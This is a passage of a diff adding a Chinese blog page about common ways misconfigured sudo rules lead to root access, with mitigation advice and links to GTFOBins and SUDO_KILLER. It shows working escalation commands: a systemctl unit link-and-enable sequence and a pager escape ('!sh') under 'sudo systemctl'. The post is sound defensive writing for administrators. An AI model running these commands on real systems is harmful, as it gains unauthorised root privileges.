+<span class="s1">WantedBy=multi-user.target&#39;</span> &gt; <span class="nv">$TF</span>
+sudo systemctl link <span class="nv">$TF</span>
+sudo systemctl <span class="nb">enable</span> --now <span class="nv">$TF</span>
+</pre></div>
+
+
+<ul>
+<li>通过编辑器或者分页器</li>
+</ul>
+<div class="highlight"><pre>sudo systemctl
+!sh
+</pre></div>
+
+
+<p><strong>解决方案</strong>：禁止直接使用，可以考虑封装在脚本里。</p>
+<p>在写这篇文章的时候，网上找到两个项目，都是跟不恰当使用<code>sudo</code>而导致用户获取root权限有关，内容更全面值得认真学习。</p>
+<p><a href="https://github.com/TH3xACE/SUDO_KILLER">SUDO_KILLER</a> - A tool to identify and exploit sudo rules' misconfigurations and vulnerabilities within sudo.</p>
+<p><a href="https://gtfobins.github.io/">GTFOBins</a> is a curated list of Unix binaries that can used to bypass local security restrictions in misconfigured systems.</p>
+<p>总而言之，使用sudo必须非常非常小心。当用户需要一些特殊权限的时候，首先应该想到除了sudo还有没有其他更好的方法。然后，如果一定要sudo，自己的配置有没有提权的风险，必须三思。</p></div>
+    <footer>
+<p class="meta">
+  <span class="byline author vcard">
+    Posted by <span class="fn">
+        Yang Liping
+    </span>
+  </span>
+<time datetime="2021-01-29T15:29:39.139086+08:00" pubdate>Fri 29 January 2021</time>  <span class="categories">
+    <a class='category' href='http://www.yanglp.com/category/tech.html'>Tech</a>
+  </span>
+  <span class="categories">
+    <a class="category" href="http://www.yanglp.com/tag/linux.html">linux</a>,    <a class="category" href="http://www.yanglp.com/tag/sudo.html">sudo</a>,    <a class="category" href="http://www.yanglp.com/tag/security.html">security</a>  </span>
+</p><div class="sharing">
+</div>    </footer>
+  </article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+  </section>
+</div>
+<aside class="sidebar">
+  <section>
+    <h1>Recent Posts</h1>
+    <ul id="recent_posts">
+      <li class="post">
+          <a href="http://www.yanglp.com/posts/2021/01/29/sudochang-yong-ti-quan-fang-shi.html">sudo常用提权方式</a>
+      </li>
+      <li class="post">
+          <a href="http://www.yanglp.com/posts/2020/05/16/git-push-sgecang-ku-dao-gitlabfu-wu-qi-shi-bai-wen-ti.html">git push sge仓库到gitlab服务器失败问题</a>
+      </li>
+      <li class="post">
+          <a href="http://www.yanglp.com/posts/2020/05/11/sge-jsv-hang-issue.html">sge jsv hang issue</a>
+      </li>
+      <li class="post">
+          <a href="http://www.yanglp.com/posts/2020/05/08/yong-gdb-deubg-bashshu-chu-bu-zheng-chang-wen-ti.html">用gdb deubg bash输出不正常问题</a>
+      </li>
+      <li class="post">
+          <a href="http://www.yanglp.com/posts/2020/04/27/bashyin-yong-ming-ling-can-shu.html">bash引用命令参数</a>
+      </li>
+    </ul>
+  </section>
+  <section>
+      
+    <h1>Categories</h1>
+    <ul id="recent_posts">
+        <li><a href="http://www.yanglp.com/category/misc.html">misc</a></li>
+        <li><a href="http://www.yanglp.com/category/tech.html">Tech</a></li>
+    </ul>
+  </section>
+ 
+
+  <section>
+  <h1>Tags</h1>
+    <a href="http://www.yanglp.com/tag/git.html">git</a>,    <a href="http://www.yanglp.com/tag/python.html">python</a>,    <a href="http://www.yanglp.com/tag/sudo.html">sudo</a>,    <a href="http://www.yanglp.com/tag/vim.html">vim</a>,    <a href="http://www.yanglp.com/tag/zfs.html">zfs</a>,    <a href="http://www.yanglp.com/tag/gdb.html">gdb</a>,    <a href="http://www.yanglp.com/tag/dns.html">DNS</a>,    <a href="http://www.yanglp.com/tag/linux.html">linux</a>,    <a href="http://www.yanglp.com/tag/security.html">security</a>,    <a href="http://www.yanglp.com/tag/sge.html">sge</a>,    <a href="http://www.yanglp.com/tag/bash.html">bash</a>  </section>
+
+
+    <section>
+        <h1>Blogroll</h1>
+        <ul>
+            <li><a href="http://getpelican.com/" target="_blank">Pelican</a></li>
+            <li><a href="http://python.org/" target="_blank">Python.org</a></li>
+            <li><a href="http://jinja.pocoo.org/" target="_blank">Jinja2</a></li>
+        </ul>
+    </section>
+
+</aside>    </div>
+  </div>
+  <footer role="contentinfo"><p>
+    Copyright &copy;  2014&ndash;2021  Yang Liping &mdash;
+  <span class="credit">Powered by <a href="http://getpelican.com">Pelican</a></span>
+</p></footer>
+  <script src="http://www.yanglp.com/theme/js/modernizr-2.0.js"></script>
+  <script src="http://www.yanglp.com/theme/js/ender.js"></script>
+  <script src="http://www.yanglp.com/theme/js/octopress.js" type="text/javascript"></script>
+    <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-50095101-1']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-50095101-1');
+    ga('send', 'pageview');
+</script>
+  <script type="text/javascript">
+    var disqus_shortname = 'yanglp';
+    var disqus_identifier = '/posts/2021/01/29/sudochang-yong-ti-quan-fang-shi.html';
+    var disqus_url = 'http://www.yanglp.com/posts/2021/01/29/sudochang-yong-ti-quan-fang-shi.html';
+    var disqus_title = 'sudo常用提权方式';
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = "//" + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+     })();
+  </script>
+</body>
+</html>
